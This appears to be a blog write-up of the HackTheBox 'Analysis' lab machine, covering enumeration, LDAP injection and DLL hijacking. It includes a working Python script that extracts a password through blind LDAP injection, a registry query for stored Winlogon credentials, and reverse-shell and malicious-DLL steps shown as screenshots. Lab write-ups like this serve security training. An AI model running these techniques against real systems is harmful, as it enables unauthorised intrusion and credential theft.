---
layout: post
title: "Analysis 0090fa0a858243a69b3e23fa77ef57f0"
date:   2025-07-10 12:05:57 -0400
categories: writeups
---

# Analysis

HackTheBox: Hard

<aside>
ðŸ’¡ A hard windows machine where we can explore a web site looking for ldap injection and dll hijacking.

</aside>

## 1: Enumeration

- nmap scanning

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled.png' | relative_url }})

We found a http service on 80 port 

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_1.png' | relative_url }})

Use gobuster to look for any subdomain

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_2.png' | relative_url }})

internal subdomain may be interesting

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_3.png' | relative_url }})

We use a FUZZ tool for search a directory (Letâ€™s dig into employees)

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_4.png' | relative_url }})

We found something interesting

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_5.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_6.png' | relative_url }})

itâ€™d be possible to make requests? Letâ€™s see users dir

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_7.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_8.png' | relative_url }})

vulnerable to ldpa injection Use a payload

```bash
import argparse
import requests
import urllib.parse

def main():
    charset_path = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    add_star = True
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)
            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue
            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue
            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)
            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)
if __name__ == "__main__":
    main()
```

- **Logic**
    1. Base URL definition: The base URL is defined as "[http://internal.analysis.htb/users/list.php?name=*](http://internal.analysis.htb/users/list.php?name=*))(%26(objectClass=user)(description={found_char}{FUZZ} *)". This URL includes a placeholder {FUZZ} that will be replaced by each character in the character file and another placeholder {found_char} that will be replaced with the characters found during the fuzzing process.
    2. Reading the character file: The character file defined in charset_path is opened and iterated over each line of the file. Each line contains a character that will be used to make requests to the URL.
    3. URL Modification: For each character in the character file, the character is encoded and the {FUZZ} placeholder in the base URL is replaced with this encoded character
    4. Sending HTTP Requests: An HTTP GET request is sent to the modified URL for each character in the character file.
    5. **Response verification: It is checked if the response contains the string "technician" and if the response status code is 200 (OK). If both conditions are met, the character is considered part of the password.**
    6. Update found password: If a character is found that appears to be part of the password, it is added to the variable found_chars, which contains the password found so far.
    7. Printing the password found: The password found so far is printed each time a new character is found that appears to be part of the password.
    8. Repetition of the process: The process continues until the complete password is found or the entire character set of the file has been scanned.
    
    In the code provided there is no explicit logic to determine the order of the characters in the password. The password is out of order due to the fuzzing process being carried out.
    

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_9.png' | relative_url }})

## 2: User flag

We into log in page we saw before

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_10.png' | relative_url }})

Send a php rev shell and get access as svc_web

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_11.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_12.png' | relative_url }})

Looking for creds on logon config

```bash
reg query "HKEY_LOCAL_MACHINE\software\Microsoft\Windows NT\Currentversion\Winlogon"
```

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_13.png' | relative_url }})

Evilwinrm port is open we can try

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_14.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_15.png' | relative_url }})

## 3: Priv esc

### Privesc CVE-2016-1417

Even when we havenâ€™t the same vulnerability here this one is really similar and the vector attack is almos the same.

- â€¢ The vulnerability exists due to an untrusted search path vulnerability.Â This means the software relies on a search path that can be controlled by an attacker.
- â€¢ Attackers can exploit this by placing a malicious DLL file (e.g.,Â "tcapi.dll") in the same directory as a PCAP file being processed by Snort.
- â€¢ When Snort tries to load libraries associated with the PCAP file,Â it might load the attacker's malicious DLL instead of the legitimate one,Â leading to code execution and potential system compromise.

Using linpeas we found there is a possible dll hijacking on 

```bash
C:\Snort\bin\snort.exe
```

Check permissions

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_16.png' | relative_url }})

First i tried to using this

---

1. Create a evil dll

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_17.png' | relative_url }})

1. set metasploit to receive connection

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_18.png' | relative_url }})

1. Upload evil dll

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_19.png' | relative_url }})

The problem was i was using a generic payload and it didnâ€™t match with the generated msfvenom payload 

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_20.png' | relative_url }})

---

but using default payloads it didnâ€™t work, so after a research i found a better and easy one:

1. Make a evil dll

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_21.png' | relative_url }})

1. Use metasploit to get connection 

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_22.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_23.png' | relative_url }})

1. Upload the evil dll

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_24.png' | relative_url }})

1. Machine pwned!!!

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png' | relative_url }})

![Untitled]({{ '/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png' | relative_url }})

[https://www.notion.so](https://www.notion.so)